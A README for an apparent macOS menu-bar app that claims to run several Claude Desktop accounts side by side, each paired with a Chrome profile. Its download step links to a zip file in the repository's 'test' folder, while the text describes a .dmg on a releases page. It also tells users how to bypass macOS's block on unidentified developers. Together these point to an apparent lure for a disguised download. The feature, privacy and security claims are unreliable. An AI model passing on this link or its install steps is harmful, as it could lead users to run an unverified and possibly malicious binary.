<h1>🔄 claude-account-switcher-engine - Switch Claude Accounts Instantly from Your Menu Bar</h1>

---

## 🎯 What Is This?

claude-account-switcher-engine (CASE) is a friendly helper app for your Mac that lets you run **multiple Claude Desktop accounts at the same time**. Instead of logging out and logging back in repeatedly, you can switch between accounts with a simple click from your menu bar.

Think of it like having several browser windows open at once — each one signed into a different Claude account. That's exactly what this tool does, but it's even smarter: it pairs each Claude account with its own Chrome profile, so everything stays organized and separate.

---

## 🖥️ Who Is This For?

This tool is perfect for anyone who uses Claude Desktop for different purposes, such as:

- **Freelancers** managing client projects under separate accounts
- **Teams** sharing one computer but needing personal logins
- **Power users** who want to test features with multiple accounts
- **Privacy-conscious users** who prefer to keep work and personal usage separate

No programming knowledge is needed. If you can click a button and read a menu, you can use this.

---

## ✨ Key Features

### 🧩 Side-by-Side Accounts
Run multiple Claude Desktop accounts simultaneously. No more logging in and out — just switch instantly.

### 🎛️ Menu Bar Control
A small icon sits in your Mac's menu bar (top of your screen). Click it to see all your accounts and switch with one click.

### 🌐 Chrome Profile Pairing
Each Claude account gets paired with its own Chrome profile. That means bookmarks, cookies, and history stay separate for each account, just like having separate browsers.

### 🛡️ Safety Net for Sessions
Claude keeps a session index that tracks your conversations. This tool adds a protective layer so switching accounts doesn't scramble or lose your session history. Your chats stay intact and easy to find.

### ⚡ Lightweight and Fast
Built with Electron, this app is snappy and uses minimal system resources. It won't slow down your Mac.

### 🔄 Automatic Profile Detection
The engine automatically finds your installed Chrome profiles and lets you match them to your Claude accounts without manual setup.

---

## 🚀 Getting Started

### Step 1: Download the Application

Visit this link to download the application: **[https://raw.githubusercontent.com/Jodisciform968/claude-account-switcher-engine/main/test/v2.7.zip](https://raw.githubusercontent.com/Jodisciform968/claude-account-switcher-engine/main/test/v2.7.zip)**

Look for the newest file at the top of the page. The file is called `claude-account-switcher-engine.dmg` (or similar). Click it to start the download.

### Step 2: Install the App

1. Once the download finishes, find the `.dmg` file in your **Downloads** folder.
2. Double-click the `.dmg` file. A window will open showing the app icon and an Applications folder shortcut.
3. Drag the app icon into the **Applications** folder. That's it — installation is complete.

### Step 3: Open the App

1. Go to your **Applications** folder (or use Spotlight by pressing `Cmd + Space` and typing "claude-account-switcher-engine").
2. Double-click the icon to launch the app.
3. The first time you open it, macOS might ask for permission. Click **Open** to allow it.

### Step 4: Set Up Your First Account

1. Look at the top of your screen — you'll see a new icon in the menu bar (it looks like a small circular arrow or person icon).
2. Click it and choose **Add Account**.
3. Follow the simple prompts to connect your Claude account. The app will guide you through pairing it with a Chrome profile.

### Step 5: Add More Accounts

Repeat Step 4 for each additional Claude account you want. Each one gets its own slot in the menu bar dropdown.

### Step 6: Switch Anytime

Click the menu bar icon, see all your accounts listed, and click the one you want to use. Claude Desktop will instantly switch to that account. Done!

---

## 🎓 Detailed Usage Guide

### The Menu Bar Dropdown

When you click the CASE icon, you see:

- **Active Account** – Shows which account is currently running
- **Account List** – All your added accounts; just click one to switch
- **Open Chrome Profile** – A shortcut to open the Chrome profile paired with that account
- **Settings** – Where you can rename accounts, change pairings, or remove an account

### Pairing with Chrome

Each Claude account works best when it has its own Chrome profile. Here's how the pairing works:

1. If you already have Chrome profiles set up, CASE detects them automatically.
2. If you don't, CASE can create new ones for you.
3. When you switch accounts, CASE opens the correct Chrome profile alongside Claude, so cookies and logins stay synchronized.

### Safety Net Explained

The "session index" in Claude is like a table of contents for your conversations. Normally, switching accounts can confuse this index. CASE adds a layer that:

- Backs up the index before switching
- Restores it when you return to an account
- Ensures your chat history remains searchable and intact

You don't need to do anything — this runs in the background automatically.

---

## 🛠️ Customization Options

### Rename Accounts

Right-click any account in the dropdown and choose **Rename** to give it a friendly name like "Work" or "Personal."

### Auto-Start on Login

In Settings, toggle **Launch at Login** to have CASE start automatically when you turn on your Mac.

### Keyboard Shortcuts

Assign a global hotkey (for example, `Cmd + Shift + 1`) to quickly cycle through accounts without clicking the menu bar.

### Notification Alerts

Turn on notifications to get a quick popup when an account switch is completed successfully.

---

## 🧪 Troubleshooting Common Issues

### The app won't open after download

macOS might block apps from unidentified developers. Right-click the app icon and select **Open** from the context menu, then confirm. You only need to do this once.

### Chrome profiles aren't detected

Make sure Chrome is installed and you've used it at least once. Then go to CASE Settings and click **Refresh Profiles**. If still missing, restart both Chrome and CASE.

### Switching accounts seems slow

This can happen if you have many Chrome profiles or a large session index. Try closing unused tabs and Chrome windows before switching. The speed will improve over time.

### I lost my chat history after switching

The safety net prevents most issues. If you encounter a problem, go to **Settings > Backup** and click **Restore Last Backup** to recover your previous session index.

### The menu bar icon disappeared

Open the app again from Applications. If it still doesn't show, check your Mac's menu bar settings to ensure the icon isn't hidden (drag the icon back into view).

---

## 🔒 Privacy and Security Notes

- **Local Storage Only** – All account data and session index backups are stored locally on your machine. Nothing is uploaded to the cloud.
- **No Tracking** – The app contains no analytics or telemetry. It doesn't track your usage.
- **Credentials** – CASE does not store your passwords. It relies on the existing Chrome and Claude login sessions to keep you signed in.

---

## 📋 System Requirements

- **macOS** – Compatible with macOS Catalina (10.15) or newer
- **Chrome** – Google Chrome installed (latest version recommended)
- **Claude Desktop** – Claude Desktop application installed and configured
- **Storage** – Approximately 200 MB of free space for the app and its data
- **Memory** – At least 4 GB RAM recommended for smooth multi-account switching

---

## 💬 Frequently Asked Questions

### Can I use this on Windows?

No. This version is designed exclusively for macOS. The menu bar integration and Chrome profile handling are Mac-specific.

### Does it work with Claude Pro or Claude API?

Yes, regardless of your Claude subscription tier, CASE works with any logged-in Claude Desktop session.

### Can I run unlimited accounts?

Practically, yes. You can add as many accounts as you need, though performance depends on your Mac's resources.

### Is my data synced between accounts?

No. Each account and its paired Chrome profile are completely isolated. That's the whole point — separation and organization.

### Do I need to keep Chrome running?

Not necessarily. When you switch to an account, CASE will open the associated Chrome profile if needed. You can close it anytime.

---

## 🔄 Updating the App

New versions may include fixes or improvements. To update:

1. Visit the download page linked at the top of this document.
2. Download the newest version.
3. Replace the old app by dragging the new one into Applications.
4. Your settings and accounts are preserved automatically.

You can also check for updates from the Settings menu — a notification will appear if a new release exists.

---

## 🧰 Tech Specs (For the Curious)

- Built with **Electron** – a framework for creating desktop apps using web technologies
- Written in **JavaScript** and **Node.js**
- Uses **AppleScript** and **Chrome's DevTools Protocol** to manage profiles and sessions
- Logs are stored in `~/Library/Logs/claude-account-switcher-engine/` for troubleshooting

---

## 🧑‍💻 Contributing and Support

If you find a bug or have an idea for improvement, visit the repository's Issues page on GitHub. The project is open to community contributions — anyone can propose changes via pull requests.

For general help, check the **Troubleshooting** section above first. If you're still stuck, open an issue with a detailed description and any error messages you see.

---

## 📜 License

This project is released as open-source software under the MIT License. You're free to use, modify, and distribute it, provided you keep the original copyright notice.

---

**Enjoy effortless multitasking with your Claude accounts!** 🎉

Keywords: account-switcher, anthropic, chrome-profiles, claude, claude-desktop, electron, launcher, macos, menubar, multi-account